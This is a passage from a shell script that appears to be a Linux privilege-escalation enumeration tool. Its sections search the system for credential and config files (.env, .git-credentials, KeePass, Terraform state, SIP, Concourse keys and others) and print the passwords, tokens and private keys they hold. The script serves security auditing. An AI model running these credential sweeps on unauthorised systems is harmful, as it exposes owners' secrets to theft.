    if ! [ "`echo \"$PSTORAGE_AUTOLOGIN\" | grep -E \"autologin\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "autologin.conf"; fi; fi; printf "%s" "$PSTORAGE_AUTOLOGIN" | grep -E "autologin\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,autologin\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,passwd,${SED_RED},g"; done; echo "";
fi


#-- SI) S/Key athentication
if (grep auth= /etc/login.conf 2>/dev/null | grep -v "^#" | grep -q skey) || [ "$DEBUG" ] ; then
  print_2title "S/Key authentication"
  printf "System supports$RED S/Key$NC authentication\n"
  if ! [ -d /etc/skey/ ]; then
    echo "${GREEN}S/Key authentication enabled, but has not been initialized"
  elif ! [ "$IAMROOT" ] && [ -w /etc/skey/ ]; then
    echo "${RED}/etc/skey/ is writable by you"
    ls -ld /etc/skey/
  else
    ls -ld /etc/skey/ 2>/dev/null
  fi
fi
echo ""

#-- SI) YubiKey athentication
if (grep "auth=" /etc/login.conf 2>/dev/null | grep -v "^#" | grep -q yubikey) || [ "$DEBUG" ]; then
  print_2title "YubiKey authentication"
  printf "System supports$RED YubiKey$NC authentication\n"
  if ! [ "$IAMROOT" ] && [ -w /var/db/yubikey/ ]; then
    echo "${RED}/var/db/yubikey/ is writable by you"
    ls -ld /var/db/yubikey/
  else
    ls -ld /var/db/yubikey/ 2>/dev/null
  fi
  echo ""
fi

if [ "$PSTORAGE_SNMP" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing SNMP Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_SNMP\" | grep -E \"snmpd\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "snmpd.conf"; fi; fi; printf "%s" "$PSTORAGE_SNMP" | grep -E "snmpd\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,snmpd\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "rocommunity|rwcommunity|extend.*|^createUser" | sed -${E} "s,rocommunity|rwcommunity|extend.*|^createUser,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_PYPIRC" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Pypirc Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_PYPIRC\" | grep -E \"\.pypirc$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".pypirc"; fi; fi; printf "%s" "$PSTORAGE_PYPIRC" | grep -E "\.pypirc$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.pypirc$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,username|password,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_POSTFIX" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Postfix Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_POSTFIX\" | grep -E \"postfix$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "postfix"; fi; fi; printf "%s" "$PSTORAGE_POSTFIX" | grep -E "postfix$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,postfix$,${SED_RED},"; find "$f" -name "master.cf" | while read ff; do ls -ld "$ff" | sed -${E} "s,master.cf,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | grep -E "user=" | sed -${E} "s,user=|argv=,${SED_RED},g"; done; echo "";done; echo "";
fi


if [ "$PSTORAGE_LDAPRC" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Ldaprc Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_LDAPRC\" | grep -E \"\.ldaprc$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".ldaprc"; fi; fi; printf "%s" "$PSTORAGE_LDAPRC" | grep -E "\.ldaprc$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.ldaprc$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "^#" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_ENV" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Env Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_ENV\" | grep -E \"\.env.*$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".env*"; fi; fi; printf "%s" "$PSTORAGE_ENV" | grep -E "\.env.*$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.env.*$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "^#" | sed -${E} "s,[pP][aA][sS][sS].*|[tT][oO][kK][eE][N]|[dD][bB]|[pP][rR][iI][vV][aA][tT][eE]|[kK][eE][yY],${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_MSMTPRC" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Msmtprc Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_MSMTPRC\" | grep -E \"\.msmtprc$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".msmtprc"; fi; fi; printf "%s" "$PSTORAGE_MSMTPRC" | grep -E "\.msmtprc$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.msmtprc$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "^#" | sed -${E} "s,user.*|password.*,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_KEEPASS" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Keepass Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_KEEPASS\" | grep -E \"\.kdbx$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*.kdbx"; fi; fi; printf "%s" "$PSTORAGE_KEEPASS" | grep -E "\.kdbx$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.kdbx$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_KEEPASS\" | grep -E \"KeePass\.config.*$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "KeePass.config*"; fi; fi; printf "%s" "$PSTORAGE_KEEPASS" | grep -E "KeePass\.config.*$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,KeePass\.config.*$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_KEEPASS\" | grep -E \"KeePass\.ini$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "KeePass.ini"; fi; fi; printf "%s" "$PSTORAGE_KEEPASS" | grep -E "KeePass\.ini$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,KeePass\.ini$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_KEEPASS\" | grep -E \"KeePass\.enforced.*$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "KeePass.enforced*"; fi; fi; printf "%s" "$PSTORAGE_KEEPASS" | grep -E "KeePass\.enforced.*$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,KeePass\.enforced.*$,${SED_RED},"; done; echo "";
fi


if [ "$PSTORAGE_FTP" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing FTP Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_FTP\" | grep -E \"vsftpd\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "vsftpd.conf"; fi; fi; printf "%s" "$PSTORAGE_FTP" | grep -E "vsftpd\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,vsftpd\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "anonymous_enable|anon_upload_enable|anon_mkdir_write_enable|anon_root|chown_uploads|chown_username|local_enable|no_anon_password|write_enable" | sed -${E} "s,anonymous_enable|anon_upload_enable|anon_mkdir_write_enable|anon_root|chown_uploads|chown_username|local_enable|no_anon_password|write_enable|[yY][eE][sS],${SED_RED},g" | sed -${E} "s,\s[nN][oO]|=[nN][oO],${SED_GOOD},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_FTP\" | grep -E \"\.ftpconfig$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*.ftpconfig"; fi; fi; printf "%s" "$PSTORAGE_FTP" | grep -E "\.ftpconfig$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.ftpconfig$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_FTP\" | grep -E \"ffftp\.ini$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "ffftp.ini"; fi; fi; printf "%s" "$PSTORAGE_FTP" | grep -E "ffftp\.ini$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,ffftp\.ini$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_FTP\" | grep -E \"ftp\.ini$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "ftp.ini"; fi; fi; printf "%s" "$PSTORAGE_FTP" | grep -E "ftp\.ini$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,ftp\.ini$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_FTP\" | grep -E \"ftp\.config$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "ftp.config"; fi; fi; printf "%s" "$PSTORAGE_FTP" | grep -E "ftp\.config$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,ftp\.config$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_FTP\" | grep -E \"sites\.ini$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "sites.ini"; fi; fi; printf "%s" "$PSTORAGE_FTP" | grep -E "sites\.ini$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,sites\.ini$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_FTP\" | grep -E \"wcx_ftp\.ini$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "wcx_ftp.ini"; fi; fi; printf "%s" "$PSTORAGE_FTP" | grep -E "wcx_ftp\.ini$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,wcx_ftp\.ini$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_FTP\" | grep -E \"winscp\.ini$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "winscp.ini"; fi; fi; printf "%s" "$PSTORAGE_FTP" | grep -E "winscp\.ini$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,winscp\.ini$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_FTP\" | grep -E \"ws_ftp\.ini$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "ws_ftp.ini"; fi; fi; printf "%s" "$PSTORAGE_FTP" | grep -E "ws_ftp\.ini$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,ws_ftp\.ini$,${SED_RED},"; done; echo "";
fi


if [ "$PSTORAGE_VARNISH" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Varnish Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_VARNISH\" | grep -E \"varnish$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "varnish"; fi; fi; printf "%s" "$PSTORAGE_VARNISH" | grep -E "varnish$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,varnish$,${SED_RED},"; find "$f" -name "default.vcl" | while read ff; do ls -ld "$ff" | sed -${E} "s,default.vcl,${SED_RED},"; done; echo "";find "$f" -name "secret" | while read ff; do ls -ld "$ff" | sed -${E} "s,secret,${SED_RED},"; done; echo "";done; echo "";
fi


if [ "$PSTORAGE_APACHE_AIRFLOW" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Apache-Airflow Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_APACHE_AIRFLOW\" | grep -E \"airflow\.cfg$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "airflow.cfg"; fi; fi; printf "%s" "$PSTORAGE_APACHE_AIRFLOW" | grep -E "airflow\.cfg$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,airflow\.cfg$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "^#" | sed -${E} "s,access_control_allow_headers|access_control_allow_methods|access_control_allow_origins|auth_backend|backend.default|google_key_path.*|password|username|flower_basic_auth.*|result_backend.*|ssl_cacert|ssl_cert|ssl_key|fernet_key.*|tls_ca|tls_cert|tls_key|ccache|google_key_path|smtp_password.*|smtp_user.*|cookie_samesite|cookie_secure|expose_config|expose_stacktrace|secret_key|x_frame_enabled,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_APACHE_AIRFLOW\" | grep -E \"webserver_config\.py$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "webserver_config.py"; fi; fi; printf "%s" "$PSTORAGE_APACHE_AIRFLOW" | grep -E "webserver_config\.py$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,webserver_config\.py$,${SED_RED},"; done; echo "";
fi


if [ "$PSTORAGE_X11" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing X11 Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_X11\" | grep -E \"\.Xauthority$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".Xauthority"; fi; fi; printf "%s" "$PSTORAGE_X11" | grep -E "\.Xauthority$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.Xauthority$,${SED_RED},"; done; echo "";
fi


if [ "$PSTORAGE_ROCKETCHAT" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Rocketchat Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_ROCKETCHAT\" | grep -E \"rocketchat\.service$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "rocketchat.service"; fi; fi; printf "%s" "$PSTORAGE_ROCKETCHAT" | grep -E "rocketchat\.service$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,rocketchat\.service$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E -i "Environment" | sed -${E} "s,mongodb://.*,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_RPCD" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Rpcd Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_RPCD\" | grep -E \"rpcd$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "rpcd"; fi; fi; printf "%s" "$PSTORAGE_RPCD" | grep -E "rpcd$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,rpcd$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,username.+|password.+,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_BITCOIN" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Bitcoin Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_BITCOIN\" | grep -E \"bitcoin\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "bitcoin.conf"; fi; fi; printf "%s" "$PSTORAGE_BITCOIN" | grep -E "bitcoin\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,bitcoin\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "^#" | sed -${E} "s,user=.*|password=.*|auth=.*,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_GLUSTERFS" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing GlusterFS Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_GLUSTERFS\" | grep -E \"glusterfs\.pem$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "glusterfs.pem"; fi; fi; printf "%s" "$PSTORAGE_GLUSTERFS" | grep -E "glusterfs\.pem$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,glusterfs\.pem$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_GLUSTERFS\" | grep -E \"glusterfs\.ca$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "glusterfs.ca"; fi; fi; printf "%s" "$PSTORAGE_GLUSTERFS" | grep -E "glusterfs\.ca$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,glusterfs\.ca$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_GLUSTERFS\" | grep -E \"glusterfs\.key$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "glusterfs.key"; fi; fi; printf "%s" "$PSTORAGE_GLUSTERFS" | grep -E "glusterfs\.key$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,glusterfs\.key$,${SED_RED},"; done; echo "";
fi


if [ "$PSTORAGE_TERRAFORM" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Terraform Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_TERRAFORM\" | grep -E \"\.tfstate$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*.tfstate"; fi; fi; printf "%s" "$PSTORAGE_TERRAFORM" | grep -E "\.tfstate$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.tfstate$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,secret.*,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_TERRAFORM\" | grep -E \"\.tf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*.tf"; fi; fi; printf "%s" "$PSTORAGE_TERRAFORM" | grep -E "\.tf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.tf$,${SED_RED},"; done; echo "";
fi


if [ "$PSTORAGE_RACOON" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Racoon Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_RACOON\" | grep -E \"racoon\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "racoon.conf"; fi; fi; printf "%s" "$PSTORAGE_RACOON" | grep -E "racoon\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,racoon\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "^#" | sed -${E} "s,pre_shared_key.*,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_RACOON\" | grep -E \"psk\.txt$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "psk.txt"; fi; fi; printf "%s" "$PSTORAGE_RACOON" | grep -E "psk\.txt$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,psk\.txt$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_ROAD_RECON" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Road Recon Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_ROAD_RECON\" | grep -E \"\.roadtools_auth$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".roadtools_auth"; fi; fi; printf "%s" "$PSTORAGE_ROAD_RECON" | grep -E "\.roadtools_auth$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.roadtools_auth$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,accessToken.*,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_GRAFANA" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Grafana Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_GRAFANA\" | grep -E \"grafana\.ini$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "grafana.ini"; fi; fi; printf "%s" "$PSTORAGE_GRAFANA" | grep -E "grafana\.ini$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,grafana\.ini$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "^#|^;" | sed -${E} "s,admin.*|username.*|password:*|secret.*,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_SIP" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing SIP Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_SIP\" | grep -E \"sip\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "sip.conf"; fi; fi; printf "%s" "$PSTORAGE_SIP" | grep -E "sip\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,sip\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,secret.*|allowguest.*=.*true,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_SIP\" | grep -E \"amportal\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "amportal.conf"; fi; fi; printf "%s" "$PSTORAGE_SIP" | grep -E "amportal\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,amportal\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*PASS.*=.*,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_SIP\" | grep -E \"FreePBX\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "FreePBX.conf"; fi; fi; printf "%s" "$PSTORAGE_SIP" | grep -E "FreePBX\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,FreePBX\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E ".*AMPDB.*=.*" | sed -${E} "s,.*AMPDB.*=.*,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_SIP\" | grep -E \"Elastix\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "Elastix.conf"; fi; fi; printf "%s" "$PSTORAGE_SIP" | grep -E "Elastix\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,Elastix\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*pwd.*=.*,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_VIRTUAL_DISKS" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Virtual Disks Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_VIRTUAL_DISKS\" | grep -E \"\.vhd$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*.vhd"; fi; fi; printf "%s" "$PSTORAGE_VIRTUAL_DISKS" | grep -E "\.vhd$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.vhd$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_VIRTUAL_DISKS\" | grep -E \"\.vhdx$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*.vhdx"; fi; fi; printf "%s" "$PSTORAGE_VIRTUAL_DISKS" | grep -E "\.vhdx$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.vhdx$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_VIRTUAL_DISKS\" | grep -E \"\.vmdk$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*.vmdk"; fi; fi; printf "%s" "$PSTORAGE_VIRTUAL_DISKS" | grep -E "\.vmdk$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.vmdk$,${SED_RED},"; done; echo "";
fi


if [ "$PSTORAGE_GIT" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Git Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_GIT\" | grep -E \"\.git-credentials$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".git-credentials"; fi; fi; printf "%s" "$PSTORAGE_GIT" | grep -E "\.git-credentials$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.git-credentials$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_ATLANTIS" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Atlantis Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_ATLANTIS\" | grep -E \"atlantis\.db$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "atlantis.db"; fi; fi; printf "%s" "$PSTORAGE_ATLANTIS" | grep -E "atlantis\.db$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,atlantis\.db$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,CloneURL|Username,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_OPERA" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Opera Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_OPERA\" | grep -E \"com\.operasoftware\.Opera$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "com.operasoftware.Opera"; fi; fi; printf "%s" "$PSTORAGE_OPERA" | grep -E "com\.operasoftware\.Opera$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,com\.operasoftware\.Opera$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$"; done; echo "";
fi


if [ "$PSTORAGE_SAFARI" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Safari Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_SAFARI\" | grep -E \"Safari$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "Safari"; fi; fi; printf "%s" "$PSTORAGE_SAFARI" | grep -E "Safari$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,Safari$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$"; done; echo "";
fi


if [ "$PSTORAGE_FAT_FREE" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Fat-Free Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_FAT_FREE\" | grep -E \"fat\.config$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "fat.config"; fi; fi; printf "%s" "$PSTORAGE_FAT_FREE" | grep -E "fat\.config$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,fat\.config$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "password.*" | sed -${E} "s,password.*,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_SHODAN" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Shodan Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_SHODAN\" | grep -E \"api_key$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "api_key"; fi; fi; printf "%s" "$PSTORAGE_SHODAN" | grep -E "api_key$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,api_key$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$"; done; echo "";
fi


if [ "$PSTORAGE_CONCOURSE" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Concourse Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_CONCOURSE\" | grep -E \"\.flyrc$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".flyrc"; fi; fi; printf "%s" "$PSTORAGE_CONCOURSE" | grep -E "\.flyrc$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.flyrc$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,token:*|value:.*,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_CONCOURSE\" | grep -E \"concourse-auth$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "concourse-auth"; fi; fi; printf "%s" "$PSTORAGE_CONCOURSE" | grep -E "concourse-auth$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,concourse-auth$,${SED_RED},"; find "$f" -name "host-key" | while read ff; do ls -ld "$ff" | sed -${E} "s,host-key,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,RSA PRIVATE KEY,${SED_RED},g"; done; echo "";find "$f" -name "local-users" | while read ff; do ls -ld "$ff" | sed -${E} "s,local-users,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";find "$f" -name "session-signing-key" | while read ff; do ls -ld "$ff" | sed -${E} "s,session-signing-key,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";find "$f" -name "worker-key-pub" | while read ff; do ls -ld "$ff" | sed -${E} "s,worker-key-pub,${SED_RED},"; done; echo "";done; echo "";
    if ! [ "`echo \"$PSTORAGE_CONCOURSE\" | grep -E \"concourse-keys$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "concourse-keys"; fi; fi; printf "%s" "$PSTORAGE_CONCOURSE" | grep -E "concourse-keys$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,concourse-keys$,${SED_RED},"; find "$f" -name "host_key" | while read ff; do ls -ld "$ff" | sed -${E} "s,host_key,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,RSA PRIVATE KEY,${SED_RED},g"; done; echo "";find "$f" -name "session_signing_key" | while read ff; do ls -ld "$ff" | sed -${E} "s,session_signing_key,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";find "$f" -name "worker_key.pub" | while read ff; do ls -ld "$ff" | sed -${E} "s,worker_key.pub,${SED_RED},"; done; echo "";done; echo "";
fi


if [ "$PSTORAGE_BOTO" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Boto Files (limit 70)"
